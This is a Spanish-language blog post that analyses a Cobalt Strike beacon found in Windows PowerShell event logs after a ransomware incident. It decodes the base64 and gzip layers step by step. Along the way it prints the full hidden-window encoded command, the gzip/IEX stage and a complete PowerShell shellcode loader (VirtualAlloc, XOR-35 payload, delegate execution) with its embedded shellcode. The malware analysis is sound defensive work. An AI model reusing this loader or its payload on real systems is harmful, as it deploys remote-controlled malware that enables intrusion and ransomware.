---
layout: post
title: Desofuscando un Beacon de Cobalt Strike
date: 2020-05-30 20:44
description: En mi día a día me crucé con la ejecución de un script de Powershell que claremente se podía ver en los logs de Event Viewer. La ejecución de este script llevó a una infección de Ransomware. Todo parece indicar que es un Beacon de Cobalt Strike.
toc: true
comments: false
tags: 
 - Malware
 - Powershell

---

## Desofuscando un Beacon de Cobalt Strike

En mi día a día me crucé con la ejecución de un script de Powershell que claremente se podía ver en los logs de Event Viewer. La ejecución de este script llevó a una infección de Ransomware. Todo parece indicar que es un Beacon de [Cobalt Strike]([https://www.cobaltstrike.com/help-beacon](https://www.cobaltstrike.com/help-beacon))

El evento se veía de la sigueinte manera:

```powershell
Log Name:      Windows PowerShell
Source:        PowerShell
Date:          Fecha
Event ID:      600
Task Category: Provider Lifecycle
Level:         Information
Keywords:      Classic
User:          N/A
Computer:      Nombre de computadora
Description:
Provider "Registry" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.14393.3471
	HostId=7a1193d3-6115-46a6-a07f-532616df3a72
	HostApplication=powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwBiAFgAUABhAE8AQgBEACsASABIADYARgBQAG0AVABHADkAZwBRAG8AQwBXAGsAYQBlAHQATwBaADgAbQBLAEQATwBTAEMAQQBTAFUASgBMAEcAVQBiAFkATQBwAGcAWQBDAHkAVABaADQATABUADkANwA3AGUAeQBNAGEAWABYADUASwA0AHoAZAA1AGwAaABJAGsAdQA3AHEAOQAxAG4AbgA5ADIAVgBSAFUAVABCAEUAcwB5AHoAUgBaAGMANgBCAEIAVQBlAEMATwBNAGUARABkAEIAVgBMAG4AZgBlAG8ASwBaAEEASAA5AEIASABKAGUAZQBHAGcAUwAzAGsAdABsAHoATQBGAGsAVABNAE4AbwB6AGEATQArAHcANABqAEgAQwBPAHYAdQBiAE8AKwBwAGoAaABOAFYATABQAEkAOAB4AG0AYQArAHEARQBQAHMAbQBqADUARQBNAEsARQBpAGQAawBSAEQAcwA3AHkANQAwAGwAVwAyAEgAQQBzAFUAdABtAEEAUgBaAGUAUgBHAFoAcgBJAHAAYgBVADQAWABDAFIATwBxAGwAdQBOAGcAMgA2AHgAbAA0AHcAZgBmACsAKwBIAGoASgBHAEEAcABGACsARgA1AHQARQBWAEQAawBuADYANwBuAHYARQBhADUAcQA2AEIAdAA2AFgAQgBKAEcAQwBuAGYAegBGAGIARQBGACsAbwByAE8AWgA4AFcAbQBUACsAZgBZAFAANABqAEYAZABXAHcAdgBJAGEAQgBxADQATQBpAHoARAByAFcAeABqAEsAQgBvAGIAWAB4AFAAcQBNAHEAWABMADQAbwAyAEsAVgB4AE8AaQAvAG8AMgB4AEQANQBYAEYAUwB2AG0AZwBxAHkATABqAHUAOAByAEcAdgBxAHUAeQBRAHQASAA4AFkAYQBvAFMAdABlAHoARwBlAFgAVQBGAGMAVgBIAEwAeQBoAGYARgBlADgAVAA3ADMAdQBKADgAOQAzAFUAZAAwAFUANwBSAEwAYgBZAFkASQBqAGoAOQBTAEMAbAAxAFYAUgBIAFYAVwBEAFoAQgAyAHkAcQBLAFkAWgBLAEgAawAzAGsAZgBaAFAAcABGAEgAMAA4AGUAagBNAE0AQQArAEcAdABTAGQARQBNAEIARwBGADAAWQB4AEUAVwBlAFQAYgBoAHgAUgBZAE8ASABKADgATQBpAFEAdABxAEMAbwBmADAAQgBRAHQARgBBAHkAYwBZAEUAUwBFAEwAVQBPAFkATAA2AEUAWAAwAGkAYQBqAG4AUQBlAGoANwBlAGIAQQA3ACsAVgAyADcAVQA3AFYASABkAGgAbQA0AHYANgB1AGsAbgBpAHEAQgBWAEYAOAB3AEwAWAAvAGcAeABPAC8AQQAwAFUAMQA0AGsANQBxAEQAYwBIADcAeAAvAG8AUgBjAEcAdgB6ADkAUQBqAEEAdAA5AHoAMwAzAEEAbABVAGQANABwAE0ARgBGAG0AUQBtAEEATgA4AFQAcgB1AGIATwB6AGkAYgBKAGsAawBBADgAYQBwADkAeQBMADkASAA3AGcARQBwADUAMQBBAFUAbgBzAEsAQQBzAGwAdQBrAGMAcwBaAEIAbwAwAHgALwA1AFMAYQAvAE4ATgBIAG4AKwBWAFUATwBYAG0AZABaAEIASgAwADEAUAA2AHMAYwBIAE4ASABtAGcAbgBqAFAATgBuAFcAbQA1AEEAMwB2AGsALwBtAHcAZQBlAHIANQBEAG0ARAB4AC8AdgBSAG8AYQB4AFAAVQBDADAAbwBnAEQAdgBQAGIAcwBqAFAARABxAFMAegBrAGoAcgBrADgAUwBQAEkAcQBaAFcAQQAvADgAVgBKAFgARABBAFgARQBhAEIAMwBRAFUAQwBlAGoAawBWAHoAVgA5ADcAWQBtAGoAYgBpADEAMQByAG0AcABEADMAagBsADQAQgBaAFQAUQBmAG4AWQBtAHoAYQBHAHEAbQBFAEcAWAByAEEARwAvADkAQgB0AG8AZQB1ADUAQwBtAFoARgBNACsAbABCAGEAYwBYAGEANwAvAEoAWgBjAHIAdgB1AFkAOAB6AHoAcQBoADEARABuAGQAaAA1AFoAQgBQAHYARQB5AGEATgBxAHcATAAzAEQAVQBUAFUAVQBOAEYAawBxAFAAOQB6AHQAaAByADcAdwBiAE0AeABGAFoAbQA2AHEAdgBRAEQAcAA0AGUAbwA2AEQAYQBCAGkAUQBoAHUAeQBDAHoAQwBNAHIAQQAyAHgAUABlAHgATABWAFAASwBvADUAVABtAGsARgBsAHYAZQBJAG4ATgBCAGUAUgBHAFQATwB2AFoAOQBLAEQAbQB3AEYARQBGAE8AWQBFAGQAaQBZAFEAbgBKAEcAZQBiAGsALwA4ADQAUAByAFcAZwBSAFkAYQA0ADMAUABsAG0ARABkAE4ASwBGAEQAQgA4AHYAbwBPAGMAYwBLAGkAcQBoAEcAMQA0AFEAUgAvAGsASAB0ADcATQA2AFMAWQB0AEMAWQBwAFcAQgBkAE8ASQAwAEUATQBEAHkAcQBjAGkAagBCADQAOABKADYARwB0AEsALwBoAGYAaQAvAFQAZgAzAGYAbQA0AHgAUAA3AGwAWgBaACsAUwBRAFMARABVAHAAeABFAGsAdABGAHIASgBjAEUAawBsAGIARABwAGMAUABSAHkAdwBUADUASgBnAEEAMQBBAHgARwAxAHoAWABNAHkAYwAyADEAbABiAFEAeABWAFMAbgBmAGgAbABzAHoANwBxADQARwBOADYAeQBwAFIAMABaAHIAMgA5AEoASAA4AEkAdgBnAFYAOQA0AGEAZQBxAGYAVABIAG0ANQBxAHcANAA2AHQAaAAzAGYAOQBWAHEAbgB0AG0AbwBQAGIAeABuAFcANABDADgAMQB3AFYAQwB1AFYAagBSAEwASQBQAFcAKwBiAHUAbQB0AEcAZAAvAFQAVABaAGIAaQArAHYAbgBRADIAWgB0AFMARABQAGYANQB1ADIAKwBJAE4ATQAyAHAAVQBXADEAZABiAGEAdAB3AHMAdgBNAHIAQgBUAHEAbwAvAG0ATwA4AHUANQAyAFAAVABlAEQAZAB2AEcAdABlAHQAQgAyADUASQArAFoAWQBaADEAWQB4AHQAdgBVAEoAaAAvAGMAYQBNADYAcgBRAE4AZQByAGMAMwBtADYAQwAyAGMANgA2AEoAMwByADQAaAA0ADQANgA5AEsANAB0AGIAZwBoAGYANwArAE0AKwBIAEMAegAzAHMAdABUACsAVgArAEsAbwBMAE0AVgBpAFYAWgA3AHQAZAA3ADcAWABOAGsAbgBpADMATABEAGUAYQA1AGYANwBuADUANQBqAHkAbABSAG4AMwAzAHUAcgBoAEoAcgBhAGYAKwBPAG8AcAB0AGwAZABXAGYARABkAHEAeAB5AEQAMwA5AE8AUgBiAFYAbQAxAHYAWABYADAAZQB2AGUAbQA3AGQAaQBXADQAbwA3ADIAZAAwAHoAYgBMAFIAcQBkAGUAMgBwAE8AZAA4ADMAeQAxAEMAWAB2AGoAMABmADMAVAB5AHIASgBBAC8AbwBZAFoAOQBPADQAKwAyAFAATABtADQAdABvAEsANgBYAGgAbgBSADcAQgAvAGEAVgBuAE8AMwBvAEgAQQBvAG4ASAA4AHEAZAB6AEgAMQBOAG4AWgB6ADgAbAArADMARwAzAEEAMwBhAGQAbgBnAEkAOQBkADMAagBaAHYAVwB4AEIAWABVAEkAcwA3AGIATwB2AFoAZwBMAG4AZAA2AHMAYQBkAFoAZAB5ADMARQBwAHUATwBIAHEAMgB1ADMASABjAHUAKwBGACsAeQBMAGgANAB2AE4ANgAyAFcAWABkAG0AQwAvAE0AMAB5AHEAcwBVAGMAWAAvAHYAMgBrADEAVwA1AGUAMQB5AE0AeAAzAFoARgA3AEYAdQAxADUAMwA3AEgANwBqADMAYgA1AFYAYgBsAFQAVwBOAGMARwBWAGwAKwByACsAbQBXADMAbgBhAHQAKwAxADMAUABXAE4ANABQAG0AcgB2AFMAWABOADkALwBHAGoAYQBHADEAVQBlAGoAeABrAGYANgBjAEQARABRAGEAegByAFcAYQB3AFAATAAyAEEAOABHAHgAbgBBAHcATgArAHIAZAB2AFYARgArAG0ARQB2AFcAdQBaAFQAQgBIAE4AbgBMADMAdgB3AEgAZwB2ADgARgBYADYAQQBqAHIANABCAE4AUQBGAFMANQBmADMARwBoAHkAZgA1ACsAUABKAG0AYwA3ADYAZgBaAFAARAA1ACsARgArAFoANwBzAEYAWgArAEsAegBtAGEAbgBFAFQANABoAEoAbQB2AEQAYgBrAHUAWgBuAHkASgBmAFcAQQBzAEQASwBxAHMAegBSAGkAVQBHAFkAZAB4ADAANgBlAGUAMQBGAEQAVgBsADEAOQBJAFQANABRAEYAeABJAGYAWABBADcAdwB2AHMAdQBLAHMAKwBqADYAMQA1AFkAQgA4AFoAVgBMAEIAdQBFADYASAA2AEIAUwBhADAARAAwAHMAeQAxAGMAdgByAGoAUgAwAEYASQBTAHAAbQBNAFkAMABEADEAMAAzAEcAUwBLAEgAQwBMAE4AWgBtAGcAbQArAGYALwA4AFoAdwBzAHUAZgBnAE4AZwBoAHcAVQBJAHMAOAA2AGkAMABMADUAZABLAEoAZgBuAC8AdQBxAFQAbABmAGgAKwBXAE8AdAAzAEUANgB0AEYAYwBYAGcANwBSAEUAMAA5AE8AYgAvAEsAVABtADcAUQBEACsAaQB3AE0AMQB1AFIALwBUAE0AQgBQAGwALwA0ADcAdABCAEsAOABaAEEANABmAG8AVQBzAGMAZQBoAGsAdgBMAGEAZAA4AHoATwBWAE0ARgA1ADMAcwBjACsAOABaAFgAcABsAGsAaQAyADQAVAA3AG4ARwBCAG0AUwBpAHMANgBCAHkAZQBwAEUAbQBQAFYAYwArAHgAaABrAHgAOQBqAE0ANAB4ACsAbwA0AEsARQBGADYAVgBsADYALwBnAFgAYwBvAFcAbwBXAHkANABLAEgAMQBtAGYAMABNADcANwBLAFcASwAzADkAQwBRADIAQQBTAGUAUwBZAFUAMgBuAFEATgBMAEMAYwB4AE4AYQBUAG8AeABJAG8AVgBoADcAeQArADMANABnADkAZAB0AHcAcwBBAEEAQQA9AD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=
```

El el evento se ve claramente que se ejecuta el script seguido de una cadena de caracteres que es codificación Base64. A desofuscar!

---

### Primer nivel de ofuscación

---

> cat > paso_01 [cadena_de_caracteres]

Una vez que tengo la cadena de caracteres en un archivito, lo desencripto de la siguiente manera:

> base64 -d paso_01 > paso_02

```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

---

Bien, una nueva cadena de carácteres en base64 pero ya se deja ver una porción de código Powershell que hace lo mismo que vamos a hacer nosotros a continuación:

> base64-d paso_02 > paso_03.gz

En este caso la decodificación origina un archivo gzip:

> file paso_03

```powershell
paso_03.gzip: gzip compressed data, from FAT filesystem (MS-DOS, OS/2, NT), original size 2999
```

---

> gzip -d paso_03.gz

---

```powershell
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
        Param ($var_module, $var_procedure)
        $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
        return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
                [Parameter(Position = 1)] [Type] $var_return_type = [Void]
        )

        $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
        $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

        return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+EuNJY0sjMyMjS9zcJCNJI0t7h3DG3PZzyosjIyN5EupycksjkycjSyOTJyNJIkklSSBxS2ZT/Pfc9nOoNwdJI3FLC0xewdz2puNXTUkjSSNJI6rFoOUnqsGg4SuoXwcvSSN1SSdxdEuOvXyY3PaodwczSSN1SyMDIyNxdEuOvXyY3Pam41c3qG8HJ6gnByLrqicHqHcHMyLhyPSoXwcvdEvj2f7f3PZ0S+W1pHHc9qgnB6hvBysa4lckS9OWgXXc9txHBzPLcNzc3H9/DX9TSlNGf05MSUwNFhUQGw0bExYRDRAWFBsTERQQEBEaEBQSFxQQFRQbFCMxF3Vb')

for ($x = 0; $x -lt $var_code.Count; $x++) {
        $var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
        start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
        IEX $DoIt
```

---

De toda es porción de código la única parte que interesa es la que está ofuscada y el comando **`bxor 35`.** Usando ****ambos se puede finalmente desencriptar el shellcode utilizando [CyberChef]

---

![img]({{ '/assets/images/desofuscando/cyberchef.png' | relative_url }}){: .center-image }*(Receta)*

---

El código resultante se puede importan en algún sitio del estilo de [[https://onlinedisassembler.com/](disassembler.io) y así se ve lo siguiente:

![img]({{ '/assets/images/desofuscando/desensamblado.png' | relative_url }}){: .center-image }*(Código desensamblado)*

Hasta aquí el análisis.

---